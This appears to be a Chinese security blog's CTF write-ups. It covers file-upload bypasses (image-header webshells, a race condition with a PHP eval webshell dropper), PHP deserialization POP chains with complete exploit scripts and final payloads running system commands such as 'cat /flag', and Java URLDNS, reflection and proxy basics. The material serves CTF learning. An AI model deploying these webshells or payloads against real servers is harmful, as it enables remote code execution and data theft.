winhex，启动！！在一句话木马文件的开头修改字节为png的 图片马无法直接被当做木马被解析，因为本质上还是图片，要配合文件包含漏洞利用，上传成功了 获取一下文件名： 连接成功： 用cmd构造图片马参考文章 最后连接成的图片在winhex中打开结构和上面的图片马一样 level15这题通过getimagesize()函数来获取图片类型，其原理依旧是通过获取文件前几个字节来判断，但是用上一题的png显示无法上传，找了个更全的文件头： 12341.Png图片文件包括8字节：89 50 4E 47 0D 0A 1A 0A。即为 .PNG。2.Jpg图片文件包括2字节：FF D8。3.Gif图片文件包括6字节：47 49 46 38 39|37 61 。即为 GIF89(7)a。4.Bmp图片文件包括2字节：42 4D。即为 BM。 前八个字节都改： 上传成功： 连接成功 level16使用exif_imagetype()函数来获取文件类型，其原理也是通过读取文件头部信息(开头几个字节)，那就好办了，和上题一样就行。 在使用时需要在php环境中启用php_exif拓展 level1712345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485$is_upload = false;$msg = null;if (isset($_POST['submit'])){ // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES['upload_file']['name']; $filetype = $_FILES['upload_file']['type']; $tmpname = $_FILES['upload_file']['tmp_name']; $target_path=UPLOAD_PATH.'/'.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,&quot;.&quot;),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false){ $msg = &quot;该文件不是jpg格式的图片！&quot;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.jpg&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = &quot;上传出错！&quot;; } }else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false){ $msg = &quot;该文件不是png格式的图片！&quot;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.png&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = &quot;上传出错！&quot;; } }else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false){ $msg = &quot;该文件不是gif格式的图片！&quot;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.gif&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = &quot;上传出错！&quot;; } }else{ $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;; }} 本题basename()函数用于返回文件路径中文件名部分的函数 imagecreatefromgif()创建一块画布，从gif地址加载gif图片； 然后经过二次渲染显示出来 原理是上传一张图片，然后再把图片下载下来，对比前后图片的十六进制码，(头部除外)，对比前后hex码相同的位置，然后在其中插入木马，比如说这张gif(一般gif会比较容易插入) 然后修改这部分 得到： level18本题考察条件竞争：看一眼源代码： 1234567891011121314151617181920212223$is_upload = false;$msg = null;if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1); $upload_file = UPLOAD_PATH . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; unlink($upload_file); } }else{ $msg = '上传出错！'; }} 用文件名截取的方式来获取后缀，真就非图片后缀不可了？如果有文件包含漏洞还可以上传图片马，可是这道题并没有提供文件包含漏洞的。再看一眼源代码，可以看见如果错误文件上传后，其实是已经上传进服务器了的，但是之后如果不满足后缀就直接删除，服务器的一切行为都需要时间，如果我可以在服务器将文件删除之前，访问一个可以创建新文件的文件，那新文件一旦创建不是就不会被删除了吗？这就是条件竞争，在服务器没来得及删除文件之前先访问文件 这里使用fwrite()函数写入文件 1&lt;?php fwrite(fopen('shell.php','w'),'&lt;?php eval($_POST[&quot;cmd&quot;]); ?&gt;');?&gt; 将上述代码重命名为jz.php bp抓包： 丢到爆破区，然后clear掉所有的爆破点，主要是为了不断上传文件 payload设置为空，不受限发包： 线程数调高点： 然后就开始攻击，不断重发包 同样的方法不断访问该文件 直到状态码出现200，就说明访问成功了，也就生成了shell.php level19","link":"/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"title":"反序列化","text":"2023 HZNUCTF ppppop打开页面发现什么也没有，查看Cookie发现存在Cookie 1Cookie=Tzo0OiJVc2VyIjoxOntzOjc6ImlzQWRtaW4iO2I6MDt9 base64解码后得到一串序列化数据 1O:4:&quot;User&quot;:1:{s:7:&quot;isAdmin&quot;;b:0;} b的值为0，尝试将b改为1伪造admin用户登录，进入网页，显示网页源码高亮： 123456789101112131415161718192021222324252627&lt;?phperror_reporting(0);include('utils.php');class A { public $className; public $funcName; public $args; public function __destruct() { $class = new $this-&gt;className; $funcName = $this-&gt;funcName; $class-&gt;$funcName($this-&gt;args); }}class B { public function __call($func, $arg) { $func($arg[0]); }}if(checkUser()) { highlight_file(__FILE__); $payload = strrev(base64_decode($_POST['payload'])); unserialize($payload);} php反序列化，审计本题就是想通过类A来调用某个类的某个方法。 编写poc验证漏洞: 1234567891011121314151617181920212223242526272829&lt;?phpclass A { public $className; public $funcName; public $args; public function __destruct() { $class = new $this-&gt;className; $funcName = $this-&gt;funcName; $class-&gt;$funcName($this-&gt;args); }}class B { public function __call($func, $arg) { $func($arg[0]); }}$a = new A();$b = new B();$a-&gt;className = $b;$a-&gt;funcName = &quot;system&quot;;$a-&gt;args = &quot;calc.exe&quot;;$test = serialize($a);$payload = base64_encode(strrev($test));echo $payload.&quot;\\n&quot;; 执行calc.exe，说明存在漏洞。更改$a-&gt;args的值，发现flag存在于环境变量中： $a-&gt;args = “env”; (Linux的环境变量也可以通过查看根目录下文件/proc/self/environ：$a-&gt;args = “cat /proc/self/environ”) POST传入 1payload=fTsidm5lIjozOnM7InNncmEiOjQ6czsibWV0c3lzIjo2OnM7ImVtYU5jbnVmIjo4OnN9ezowOiJCIjoxOk87ImVtYU5zc2FsYyI6OTpzezozOiJBIjoxOk8= 本题顺便复习了下___call()以及___destruct()魔术方法的使用方法： __call():1__call($method,$arg_array);//调用一个未定义的方法的时候调用。当调用当前对象不存在的方法时，转向__call() 也就是说，如果test()方法未定义，那么test这个方法就会作为__call()的第一个参数传入，而test的参数会被装进数组中作为__call()的第二个参数传入。所以当调用 1$foo-&gt;test(1,&quot;2&quot;,3.4,true); 时，实际是相当于调用 1$foo-&gt;__call(&quot;test&quot;,array(1,&quot;2&quot;,3.4,true)); 本题中B类中$funcName未定义，那么在A类中调用 1$class-&gt;$funcName($this-&gt;args); 时，A::$funcName就会被传入B类__call()中的$func，A::$args传入B类的$arg，而$arg[0]就是字符串”calc.exe”。 在B中转向执行__call()也就是B::$func(B::arg[0]);也就是system(“calc.exe”); __destruct():类的析构函数，在销毁一个类之前执行一些操作。 12345#声明格式：function __destruct(){ //TODO}#注意：析构函数不能带有任何参数 1234567891011121314151617181920212223242526#举例演示：&lt;?phpclass Person{ public $name; public $age; public $sex; public function __construct($name=&quot;&quot;,$sex=&quot;男&quot;,$age=22) { $this-&gt;name=$name; $this-&gt;sex=$sex; $this-&gt;age=$age; } public function say()#构造说话方法 { echo &quot;我叫：&quot;.$this-&gt;name.&quot;，性别：&quot;.$this-&gt;sex.&quot;，年龄：&quot;.$this-&gt;age; } public function __destruct()#声明一个析构方法 { echo &quot;我觉得我还可以再抢救一下，我的名字叫&quot;.$this-&gt;name; }}$Person=new Person(&quot;小明&quot;);unset($Person);//销毁上面创建的对象$Person#output#我觉得我还可以再抢救一下，我的名字叫小明 __construct():构造函数，使用new关键字实例化一个对象的时候构造函数自动调用。一个类中只能存在一个构造函数。与析构函数不同的是__construct()可以带有参数（可选，不需要时可以省略），如果构造函数有参数的话，在实例化对象时也要传入对应的参数，例如上述destruct()方法示例中的 1234567891011121314$Person=new Person(&quot;小明&quot;);//也可以将上例中的__construct($name=&quot;&quot;,$sex=&quot;男&quot;,$age=22)参数的值进行修改，随意改，最终参数的值只看实例化传入的，//例如构造函数声明和类Person实例化如下：public function __construct($name=&quot;&quot;,$sex=&quot;男&quot;,$age=22) { $this-&gt;name=$name; $this-&gt;sex=$sex; $this-&gt;age=$age; }......$Person=new Person(&quot;小红&quot;,&quot;女&quot;，23);......//则最后运行结果为//我叫：小红，性别：女，年龄：23 如果没有在代码中显示地声明构造函数，类中会默认存在一个没有参数列表并且内容为空的构造函数。如果显示地声明了构造函数则类中的默认构造方法将不会存在。所以构造函数通常用来做一些准备工作，比如为某些参数赋值。 注意：如果显示地声明构造函数，那么它的访问权限必须是public，而且构造函数是在实例化时自动调用的，我们不需要手动调用。 2023ROIS冬令营week4 babyphp这题综合性比较强，考察了挺多方面的东西的（大哭 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?phperror_reporting(0);function backdoor(){ $a = $_GET[&quot;a&quot;]; $b = $_GET[&quot;b&quot;]; $d = $_GET[&quot;d&quot;]; $e = $_GET[&quot;e&quot;]; $f = $_GET[&quot;f&quot;]; $g = $_GET[&quot;g&quot;]; $class = new $a($b); $str1 = substr($class, $d, $e); $str2 = substr($class, $f, $g); $str1($str2);}class popko{ public $left; public $right;// public function __destruct() public function __call($method,$args) { if (($this-&gt;left != $this-&gt;right) &amp;&amp; (md5($this-&gt;left) === md5($this-&gt;right)) &amp;&amp; (sha1($this-&gt;left) === sha1($this-&gt;right))) { echo &quot;backdoor is here&quot;; backdoor(); } } public function __wakeup() { $this-&gt;left = &quot;&quot;; $this-&gt;right = &quot;&quot;; }}class pipimi{ function __destruct() { echo $this-&gt;a-&gt;a(); }}$c = $_GET[&quot;c&quot;];if ($c != null) { if (strstr($_GET[&quot;c&quot;], &quot;popko&quot;) === false) { unserialize($_GET[&quot;c&quot;]); } else { echo &quot;:)&quot;; }} else { highlight_file(__FILE__);} 开局直接一波代码审计。先看后端代码，是反序列化，很明显是希望执行backdoor()后门来进行rce，执行backdoor()方法就要执行popko类里的__call()方法，执行popko里的__call()方法就要调用一个未定义的方法，再往下看发现pipimi类中a类和a方法均未定义，pop链就比较明显了： 1pipimi::__destruct() =&gt; popko::__call() =&gt; backdoor() 再看__call()方法下的规则 1234if (($this-&gt;left != $this-&gt;right) &amp;&amp; (md5($this-&gt;left) === md5($this-&gt;right)) &amp;&amp; (sha1($this-&gt;left) === sha1($this-&gt;right))) { echo &quot;backdoor is here&quot;; backdoor(); } 要求popko类中的$left和$right不相同但是md5编码和sha1编码强比较相同，因此popko-&gt;left和popko-&gt;right均为数组 编写poc： 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phperror_reporting(0);function backdoor(){ system(&quot;calc.exe&quot;);}class popko{ public $left; public $right;// public function __destruct() public function __call($method,$args) { backdoor(); } #public function __wakeup() #{ # $this-&gt;left = &quot;&quot;; # $this-&gt;right = &quot;&quot;; #}}class pipimi{ function __destruct() { echo $this-&gt;a-&gt;a(); }}$pop=new popko();$pop-&gt;left=[1];$pop-&gt;right=[2];$pip=new pipimi();$pip-&gt;a=$pop;echo serialize($pip); 漏洞存在，注意到popko类中的__wakeup()方法若执行会将left和right的值清空，_call()方法体的条件无法满足因此要绕过__wakeup()方法， 将生成的exp进行修改： 123O:6:&quot;pipimi&quot;:1:{s:1:&quot;a&quot;;O:5:&quot;popko&quot;:2:{s:4:&quot;left&quot;;a:1:{i:0;i:1;}s:5:&quot;right&quot;;a:1:{i:0;i:2;}}}//将popko的对象数2改为比2大的数O:6:&quot;pipimi&quot;:1:{s:1:&quot;a&quot;;O:5:&quot;popko&quot;:3:{s:4:&quot;left&quot;;a:1:{i:0;i:1;}s:5:&quot;right&quot;;a:1:{i:0;i:2;}}} 注意到函数主体部分有判断语句 123if (strstr($_GET[&quot;c&quot;], &quot;popko&quot;) === false) { unserialize($_GET[&quot;c&quot;]); } strrstr()函数区分大小写，但是php类不区分大小写，进行大写绕过 1O:6:&quot;pipimi&quot;:1:{s:1:&quot;a&quot;;O:5:&quot;Popko&quot;:3:{s:4:&quot;left&quot;;a:1:{i:0;i:1;}s:5:&quot;right&quot;;a:1:{i:0;i:2;}}} GET传入c 进入后门后查看backdoor()函数体： 12345678910111213function backdoor(){ $a = $_GET[&quot;a&quot;]; $b = $_GET[&quot;b&quot;]; $d = $_GET[&quot;d&quot;]; $e = $_GET[&quot;e&quot;]; $f = $_GET[&quot;f&quot;]; $g = $_GET[&quot;g&quot;]; $class = new $a($b); $str1 = substr($class, $d, $e); $str2 = substr($class, $f, $g); $str1($str2);} $a是一个类，向类$a中传入参数$b返回值赋值给$class。但是并未定义这样一个满足条件的类，这时候就要去学习php原生类的知识了。查找到原生类ERROR。 可以看到返回值前面几个字符为 1Error: 12345#注意引号和字符串&quot;12345&quot;之间有个空格 目的就很明确了，$a为ERROR原生类，$b为一个由命令执行函数和执行的命令组成的字符串。$d和$e代表命令执行函数在ERROR返回值中的首位置和命令执行函数的长度，$f和$g代表所执行的命令在ERROR返回值中的首位置和长度进行截取。 1234567$a = &quot;ERROR&quot;;$b = &quot;systemls&quot;#此时error返回Error: systemls，其中s位于第七个位置，&quot;system&quot;长度6，同理，l位于13，&quot;ls&quot;长度2，则$d = 7;$e = 6;$f = 13;$g = 2; GET传入a、b、d、e、f、g对应的值。 命令执行成功了。 对b、d、e、f、g进行修改，发现根目录下存在flag。 最终payload： 1?c=O:6:&quot;pipimi&quot;:1:{s:1:&quot;a&quot;;O:5:&quot;Popko&quot;:3:{s:4:&quot;left&quot;;a:1:{i:0;i:1;}s:5:&quot;right&quot;;a:1:{i:0;i:2;}}}&amp;a=Error&amp;b=systemcat /flag&amp;d=7&amp;e=6&amp;f=13&amp;g=9 2023安洵杯easy_unserialize题目源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101&lt;?phperror_reporting(0);class Good{ public $g1; private $gg2; public function __construct($ggg3) { $this-&gt;gg2 = $ggg3; } public function __isset($arg1) { if(!preg_match(&quot;/a-zA-Z0-9~-=!\\^\\+\\(\\)/&quot;,$this-&gt;gg2)) { if ($this-&gt;gg2) { $this-&gt;g1-&gt;g1=666; } }else{ die(&quot;No&quot;); } }}class Luck{ public $l1; public $ll2; private $md5; public $lll3; public function __construct($a) { $this-&gt;md5 = $a; } public function __toString() { $new = $this-&gt;l1; return $new(); } public function __get($arg1) { $this-&gt;ll2-&gt;ll2('b2'); } public function __unset($arg1) { if(md5(md5($this-&gt;md5)) == 666) { if(empty($this-&gt;lll3-&gt;lll3)){ echo &quot;There is noting&quot;; } } }}class To{ public $t1; public $tt2; public $arg1; public function __call($arg1,$arg2) { if(urldecode($this-&gt;arg1)===base64_decode($this-&gt;arg1)) { echo $this-&gt;t1; } } public function __set($arg1,$arg2) { if($this-&gt;tt2-&gt;tt2) { echo &quot;what are you doing?&quot;; } }}class You{ public $y1; public function __wakeup() { unset($this-&gt;y1-&gt;y1); }}class Flag{ public function __invoke() { echo &quot;May be you can get what you want here&quot;; array_walk($this, function ($one, $two) { $three = new $two($one); foreach($three as $tmp){ echo ($tmp.'&lt;br&gt;'); } }); }}if(isset($_POST['D0g3'])){ unserialize($_POST['D0g3']);}else{ highlight_file(__FILE__);}?&gt; 注意到Flag类中有__invoke()方法，当一个Flag类对象被当作方法来调用时会自动触发__invoke()，__invoke()方法下存在一个函数array_walk()，将Flag对象中的成员作为参数传入一个回调函数中。变量值为第一个参数变量名为第二个参数,eg： 题目代码中存在语句：，new一个对象并输出很容易想到php原生类的利用。因此将其作为poc链的终点 那么想触发__invoke()就需要将一个Flag对象作为方法来调用，注意到Luck类的__toString()方法中存在可控方法的调用 触发__toString()方法的条件为当Luck对象被当作字符串处理时（与字符串拼接，打印出来，以及编码，正则匹配等等操作都会自动调用），这里有两处编码，一处是To类中___call()方法中，一处是Luck类中__unset()方法下的md5()处。但是__call()方法的触发需要调用一个类中不存在的方法，需要满足两个条件，类可控，调用方法可控，代码中不存在满足条件的方法。而__unset()方法，需要在对未定义成员或者私有属性调用unset()方法时触发，注意到You类的__wakeup()方法下正好有个unset()方法。 至此poc链形成： 1You::__wakeup()-&gt;Luck::__unset()-&gt;Luck::__toString-&gt;Flag::__invoke() 使用GlobIterator原生类构造poc(列出目录)： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?phperror_reporting(0);class Luck{ public $l1; public $md5; public function __toString() { $new = $this-&gt;l1; return $new(); } public function __unset($arg1) { if(md5(md5($this-&gt;md5)) == 666) { if(empty($this-&gt;lll3-&gt;lll3)){ echo &quot;There is noting&quot;; } } }}class You{ public $y1; public function __wakeup() { unset($this-&gt;y1-&gt;y1); }}class Flag{ public $GlobIterator = &quot;/*&quot;; public function __invoke() { echo &quot;May be you can get what you want here&quot;; array_walk($this, function ($one, $two) { $three = new $two($one); foreach($three as $tmp){ echo ($tmp.'&lt;br&gt;'); } }); }}$flag = new Flag();$luck = new Luck();$luck-&gt;l1 = $flag;$luck1 = new Luck();$luck1-&gt;md5 = $luck;$you = new You();$you-&gt;y1 = new You();$you-&gt;y1-&gt;y1 = $luck1;echo urlencode(serialize($you));?&gt; exp： 1O%3A3%3A%22You%22%3A1%3A%7Bs%3A2%3A%22y1%22%3BO%3A3%3A%22You%22%3A1%3A%7Bs%3A2%3A%22y1%22%3BO%3A4%3A%22Luck%22%3A2%3A%7Bs%3A2%3A%22l1%22%3BN%3Bs%3A3%3A%22md5%22%3BO%3A4%3A%22Luck%22%3A2%3A%7Bs%3A2%3A%22l1%22%3BO%3A4%3A%22Flag%22%3A1%3A%7Bs%3A12%3A%22GlobIterator%22%3Bs%3A2%3A%22%2F%2A%22%3B%7Ds%3A3%3A%22md5%22%3BN%3B%7D%7D%7D%7D 再使用SplFileObject原生类读取文件： Java反序列化基础知识：1234//序列化：ObjectOutputStream//反序列化：ObjectInputStream 序列化过程： 123456public class Serialize { public static void Serialize(Object obj) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;src/main/java/com/test/serializetest/file/wow.dat&quot;)); oos.writeObject(obj); }} 反序列化过程： 1234567public class Unserialize { public static Object Unserialize(String Filename) throws Exception{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; }} 被序列化的类需要使用Serializable接口： 123456789101112131415package com.test.serializetest;import java.io.Serializable;public class Person implements Serializable { private transient String name; private int age; public Person(String name,int age){ this.name = name; this.age = age; } public String toString(){ return &quot;{ name : '&quot;+name+&quot;' ; age : &quot;+age+&quot; }&quot;; }} transient关键字修饰的不会被序列化 可能的情况： 入口类readObject()方法直接调用危险函数(极小概率。实际开发没有人会闲着没事) 重写readObject()方法，写入危险函数(反序列化靶场1： 序列化一个Person对象后将其反序列化，弹窗计算器 URLDNS:一个很完美的入口类：HashMap 它继承了Serializable接口，用于序列化操作： HashMap类重写了readObject()方法，这是必要的 我们跟进HashMap类： 进到HashMap重写的readObject()方法，注意到调用了hash()方法： 跟进到hash()方法内，并在传入的对象不为null时调用hashCode()方法： 跟进hashCode()方法： 直接来到了Object类的hashCode()函数；至此，HashMap类我们需要利用到的链已经梳理清楚了，我们接下来寻找另一个可利用类：URL，URL类是Java的net包中提供的一个用于进行网络请求的类，内置很多的请求方法。 继承了Serializable接口，nice！ 有个hashCode()方法，这里有个注意点在于黄色框框内的条件，如果hashCode的值不为-1，那么直接返回hashCode值而不执行下面的handler.hashCode()，那我们继续跟进hashCode() 这里有个getHostAddress()方法： getHostAddress()-&gt;getByName()，就是获取一个请求域名的ip地址，那就必然会触发dns解析，可以作为黑盒时反序列化存在验证的特征 在HashMap中的hashCode()方法可以走到URL的hashCode()方法中 调用如下代码： 12345public static void main(String[] args) throws Exception { HashMap&lt;URL,Integer&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(new URL(&quot;http://9fph4lv8yyoc7whmcdbzs13j8ae32tqi.oastify.com&quot;),1); Serialize. Serialize(hashMap);} 按理来说在序列化过程中并不会调用readObject()方法，不会触发DNS解析，可是实际上却是收到了来自hook的请求： 问题是出在了put()方法上，查看put的代码： 显而易见，在put()时就已经调用了hash()方法(为确保键的唯一性)： 而hash()方法调用了hashCode()方法，就导致不需要经过反序列化readObject()方法就可以调用URL的hashCode()方法，理解了这个之后我们会发现只需要到put()这一步就可以触发hashCode()了，那必然会对我们URLDNS探测反序列化漏洞造成混淆： 那么对一个已经序列化好的对象反序列化呢？能否触发readObject()方法呢？答案是不行的，在对URL进行分析时我们上面注意到，只有当hashCode值为-1时才执行handler.hashCode()， 同时类里定义了hashCode初始值为-1 在反序列化过程中由于我们的hashmap对象put了一个URL-&gt;Integer键值对，在URL::hashCode()方法中，如果hashCode为-1时，是会执行hashCode = handler.hashCode(this)语句从而改变hashCode的值，不再为-1 ，所以hashCode值已经不为-1了， 那么有没有办法可以把已经实例化的对象的值进行操作呢？在put操作完之后将hashCode的值改回-1，答案是有的，那就是反射： 反射：获取原型以及生成对象(Class,Instance)：Class类：反射就是通过操作Class类，从原型class中实例化对象，修改属性等等： 123456Person person = new Person(&quot;potato&quot;,19);Class c = person.getClass();//c.newInstance();Constructor constructor = c.getConstructor(String.class,int.class);Person p = (Person) constructor.newInstance(&quot;lff&quot;,18);System.out.println(p.toString()); 看以上代码： 先调用Person类构造器生成了一个person实例，属性值name为potato，age为19； 通过Class类下的getClass()方法来获取person对象的类的原型c； 此时如果像注释中直接调用newInstance()方法，那么默认是通过无参构造函数实例化对象的，但是显然，我们的Person类下的构造函数是有参的，这时就要使用Constructor类下的getConstructor()方法来构造有参实例了 查看getConstructor()方法的源码，参数是类泛型 然后将constructor对象调用newInstance()方法，来生成一个实例（返回Object对象），此时可以直接在newInstance()方法中传参。 或者： 1Class c = Class.forName(&quot;Person&quot;); 属性(Field)：获取原型的属性：getField()：从类原型中获取公有属性，返回一个Field类型对象 getFields()：从类原型中获取公有属性们，返回一个Field类型对象数组 getDeclaredFiled()：从类原型中获取任何属性，返回一个Field类型对象 getDeclaredFields()：从类原型中获取任何属性们，返回一个Field类型对象数组 如当我的age属性是私有的，那么不使用declared就无法访问到，使用getDeclaredFields()： 1234567891011121314151617public class SerializeTestApplication { public static void main(String[] args) throws Exception { Person person = new Person(&quot;potato&quot;,19); Class c = person.getClass(); Constructor constructor = c.getConstructor(String.class,int.class); Person p = (Person) constructor.newInstance(&quot;lff&quot;,18); System.out.println(p.toString()); Field[] fields = c.getDeclaredFields(); for (Field field: fields){ System.out.println(field); }}/**输出{ name : 'lff' ; age : 18 }public java.lang.String com.test.serializetest.Person.nameprivate int com.test.serializetest.Person.age//会将age也获取到**/ 如果使用 12Field f = c.getField(&quot;age&quot;);System.out.println(f); 就会抛出异常信息： 但是使用 12Field f = c.getDeclaredField(&quot;age&quot;);System.out.println(f); 输出 1private int com.test.serializetest.Person.age 获取对象属性值：Field.getName()：获取Field类型对象的属性名，返回字符串类型对象 12345678Field[] fields = c.getDeclaredFields();for (Field field: fields){ System.out.println(field.getName());}/**输出nameage**/ Field.get(Object obj)：从obj对象中获取field类型中名为***的属性的值 12Field f = c.getDeclaredField(&quot;name&quot;);System.out.println(f.get(p)); 修改对象属性值：set(Object obj,&quot;new_value&quot;)：将Field对象所映射属性在obj对象中对应的值改为”new_value” 1234Field f = c.getDeclaredField(&quot;name&quot;);System.out.println(f.get(p));f.set(p,&quot;potato&quot;);System.out.println(f.get(p)); 输出： 12lffpotato 但是在修改私有属性age的值的时候会发现抛出了异常： 1234Field f = c.getDeclaredField(&quot;age&quot;);System.out.println(f.get(p));f.set(p,20);System.out.println(f.get(p)); 原因是无法修改私有属性的值(实操get()也不行，即无法获取私有属性的值)，但是反射赋予了我们极大的权限，可以修改属性的修饰符： setAccessible(boolen)： 12345Field f = c.getDeclaredField(&quot;age&quot;);f.setAccessible(true);System.out.println(f.get(p));f.set(p,20);System.out.println(f.get(p)); 给field对象调用该方法，修改其对应映射的属性的权限 方法：getMethod()： getMethods()： getDeclaredMethod()： getDeclaredMethods()： 具体实现方法和属性的类似，以getMethod()为例： 12Method method = c.getDeclaredMethod(&quot;toString&quot;);System.out.println(method.invoke(p)); getDeclaredMethod()方法从类原型中获取名为toString的类方法，返回一个Method类型的对象 Method对象的invoke()方法，是调用对象p中的toString()方法，即打印出个人信息，结果如下： 但是如果是有参的方法的情况呢？ 我们在Person类里新定义一个eat()方法： 如此调用： 12Method method = c.getDeclaredMethod(&quot;eating&quot;);method.invoke(p,&quot;apple&quot;); 便出现了异常： 实际上与构造器类Constructor类似的，我们在获取有参方法时要传入参数： 修改为： 12Method method = c.getDeclaredMethod(&quot;eating&quot;, String.class);method.invoke(p,&quot;apple&quot;); 达到预期 接下来就开始利用反射调URLDNS链，使其达到预期用于检测反序列化漏洞的目的： 利用反射调URLDNS链：12345678910111213public class SerializeTestApplication { public static void main(String[] args) throws Exception { HashMap&lt;URL,Integer&gt; hashMap = new HashMap&lt;&gt;(); URL url = new URL(&quot;http://665eab82.dnslog.store.&quot;); Class c = url.getClass(); Field hashCodeField = c.getDeclaredField(&quot;hashCode&quot;); hashCodeField.setAccessible(true); hashCodeField.set(url,114514); hashMap.put(url,1); hashCodeField.set(url,-1); Serialize.Serialize(hashMap);// Unserialize.Unserialize(&quot;src/main/java/com/test/serializetest/file/data.dat&quot;); } 在put之前将hashCode的值通过反射改为任意-1外的值，导致在调用put()方法时无法调用hashCode()方法，避免了因为put造成的影响查看DNS接受的数据，在put()调用之后，将hashCode的值再改为-1，满足readObject()方法中调用hashCode()的条件，序列化过程未接受到数据。 1234public class SerializeTestApplication { public static void main(String[] args) throws Exception { Unserialize.Unserialize(&quot;src/main/java/com/test/serializetest/file/data.dat&quot;); } 反序列化过程中，会调用HashMap中readObect()中的hashCode()，同名方法也就会调用URL类中的hashCode()方法，因为hashCode值为-1，所以会调用hashCode()方法 DNSLog接收到解析数据： 做个断点调试，在此处下断点，进行反序列化，发现从文件中读取进行反序列化的过程中hashCode的值是-1： URLDNS链利用的是同名方法hashCode()，那如果想调用除了同名方法之外的方法呢？通过invoke() 如果是像Runtime这样的没办法序列化的类呢？利用Class类来创建对象 JDK代理：关于代理模式，这篇文章讲的非常清楚了，稍微整理一下内容： 代理，同网络中代理服务器的概念类似的，是引入一个中间人(代理对象)来代替对真实对象的访问，这样就可以在不修改原目标对象的前提下，提供额外的功能操作，扩展目标对象的功能。代理模式的主要作用是扩展目标对象的功能，比如说在目标对象的某个方法执行前后你可以增加一些自定义的操作。 静态代理：比如说，就以模拟代理服务器为例： 定义一个模拟网络连接的接口 123public interface NetConnector{ public void connect(String ip);} 模拟网络连接接口的实现类： 12345public class userConnect implements NetConnector{ public void connect(String ip){ System.out.println(&quot;you've connected to &quot;+ip); }} 创建代理类并实现网络连接的接口 123456789101112public class UserProxy implements NetConnector{ private final NetConnector netConnector; public UserProxy(NetConnector netConnector){ this.netConnector = netConnector; } @Override public void connect(String ip){ Systrm.out.println(&quot;Before connect()&quot;); netConnector.connect(ip); Systrm.out.println(&quot;After connect()&quot;); }} 主函数实现： 1234567public class Main{ public static void main(String[] args){ NetConnector netConnector = new NetConnector(); UserProxy userProxy = new UserProxy(netConnector); userProxy.connect(&quot;127.0.0.1&quot;); }} 执行后输出： 123Before connect()you've connected to 127.0.0.1After connect() 静态代理存在非常大的缺陷，即如果接口一旦修改或者新增方法，目标对象和代理对象都要修改，非常麻烦。并且实现起来不够灵活，需要被代理和代理类都实现一遍接口，当然实现类要写很多方法是必然的，但是代理的时候要写很多就很麻烦了。静态代理是在编译时就将接口，目标类和代理类全都编译成了一个个class文件 动态代理：动态代理技术主要运用的是java中Proxy类下的 newProxyInstanc()方法，方法源代码如下： 其参数列表： 第一个参数是一个类加载器，java中基本上所有类的类加载器都相同；第二个是要代理的接口，可以传入多个，但是一般就一个，第三个参数是InvocationHandler类型的对象，下面会对InvocationHandler进行讲解 定义接口IUser： 1234567package org.example;public interface IUser { void show(); void create(); void update();} 实现类UserImpl： 123456789101112131415161718package org.example;public class UserImpl implements IUser { @Override public void show(){ System.out.println(&quot;show&quot;); } @Override public void create(){ System.out.println(&quot;create&quot;); } @Override public void update() { System.out.println(&quot;update&quot;); }} 写一个类来实现InvocationHandler接口，该接口仅一个方法invoke()，需要重写： 重写的时候最主要的参数就是method， 1234567891011121314151617package org.example;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;public class UserInvocationHandler implements InvocationHandler { private IUser user; public UserInvocationHandler(IUser user){ this.user = user; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { method.invoke(user,args); return null; }} 动态代理类： 123456789101112131415package org.example;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;public class ProxyTest 